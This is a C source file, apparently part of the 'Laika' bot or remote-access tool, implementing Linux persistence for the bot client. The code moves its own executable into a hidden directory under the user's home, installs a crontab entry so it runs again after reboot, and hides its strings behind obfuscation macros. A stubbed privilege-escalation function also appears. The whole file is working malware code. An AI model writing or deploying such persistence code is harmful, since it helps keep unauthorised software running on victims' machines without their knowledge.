/* platform specific code for achieving persistence on linux */

#include "lbox.h"
#include "lconfig.h"
#include "lerror.h"
#include "lmem.h"
#include "lsocket.h"
#include "persist.h"

#include <pwd.h>
#include <sys/file.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static int laikaB_lockFile;

/* check if laika is running as super-user */
bool laikaB_checkRoot()
{
    return geteuid() == 0; /* user id 0 is reserved for root in 99% of the cases */
}

/* mark that laika is currently running */
void laikaB_markRunning()
{
    LAIKA_BOX_SKID_START(char *, filePath, LAIKA_LIN_LOCK_FILE);

    /* create lock file */
    if ((laikaB_lockFile = open(filePath, O_RDWR | O_CREAT, 0666)) == -1)
        LAIKA_ERROR("Couldn't open file lock '%s'! Another LaikaBot is probably running.\n",
                    filePath);

    /* create lock */
    if (flock(laikaB_lockFile, LOCK_EX | LOCK_NB) != 0)
        LAIKA_ERROR("Failed to create file lock!\n");

    LAIKA_DEBUG("file lock created!\n");
    LAIKA_BOX_SKID_END(filePath);
}

/* unmark that laika is currently running */
void laikaB_unmarkRunning()
{
    /* close lock */
    if (flock(laikaB_lockFile, LOCK_UN) != 0)
        LAIKA_ERROR("Failed to close file lock!\n");

    close(laikaB_lockFile);
    LAIKA_DEBUG("file lock removed!\n");
}

void getCurrentExe(char *outPath, int pathSz)
{
    int sz;

    /* thanks linux :D */
    if ((sz = readlink("/proc/self/exe", outPath, pathSz - 1)) == -1)
        LAIKA_ERROR("Failed to grab current process executable path!\n");

    outPath[sz] = '\0';
}

void getInstallPath(char *outPath, int pathSz)
{
    struct stat st;
    const char *home;

    /* try to read home from ENV, else get it from pw */
    if ((home = getenv("HOME")) == NULL) {
        home = getpwuid(getuid())->pw_dir;
    }

    /* create install directory if it doesn't exist */
    LAIKA_BOX_SKID_START(char *, dirPath, LAIKA_LIN_INSTALL_DIR);
    LAIKA_BOX_SKID_START(char *, filePath, LAIKA_LIN_INSTALL_FILE);
    snprintf(outPath, pathSz, "%s/%s", home, dirPath);
    if (stat(outPath, &st) == -1) {
        LAIKA_DEBUG("creating '%s'...\n", outPath);
        mkdir(outPath, 0700);
    }

    snprintf(outPath, pathSz, "%s/%s/%s", home, dirPath, filePath);
    LAIKA_BOX_SKID_END(dirPath);
    LAIKA_BOX_SKID_END(filePath);
}

bool checkPersistCron(char *path)
{
    char buf[PATH_MAX + 128];
    FILE *fp;
    bool res = false;

    if ((fp = popen("crontab -l", "r")) == NULL)
        LAIKA_ERROR("popen('crontab') failed!");

    while (fgets(buf, sizeof(buf), fp)) {
        if (strstr(buf, path)) {
            /* laika is installed in the crontab! */
            res = true;
            break;
        }
    }

    pclose(fp);
    return res;
}

void tryPersistCron(char *path)
{
    LAIKA_BOX_SKID_START(char *, cronCMD, LAIKA_LIN_CRONTAB_ENTRY);
    char cmd[PATH_MAX + 128];

    /* should be 'safe enough' */
    snprintf(cmd, PATH_MAX + 128, cronCMD, path);

    /* add laika to crontab */
    if (system(cmd))
        LAIKA_ERROR("failed to install '%s' to crontab!\n", path);

    LAIKA_DEBUG("Installed '%s' to crontab!\n", path);
    LAIKA_BOX_SKID_END(cronCMD);
}

/* try to gain persistance on machine */
void laikaB_tryPersist()
{
    char exePath[PATH_MAX];
    char installPath[PATH_MAX];

    /* grab current process's executable & get the install path */
    getCurrentExe(exePath, PATH_MAX);
    getInstallPath(installPath, PATH_MAX);

    /* move exe to install path (if it isn't there already) */
    if (strncmp(exePath, installPath, strnlen(exePath, PATH_MAX)) != 0 &&
        rename(exePath, installPath))
        LAIKA_ERROR("Failed to install '%s' to '%s'!\n", exePath, installPath);

    LAIKA_DEBUG("Successfully installed '%s'!\n", installPath);

    LAIKA_TRY
        /* enable persistence on reboot via cron */
        if (!checkPersistCron(installPath))
            tryPersistCron(installPath);
    LAIKA_CATCH
        LAIKA_DEBUG("crontab not installed or not accessible!");
    LAIKA_TRYEND
}

/* try to gain root */
void laikaB_tryRoot()
{
    /* stubbed */
}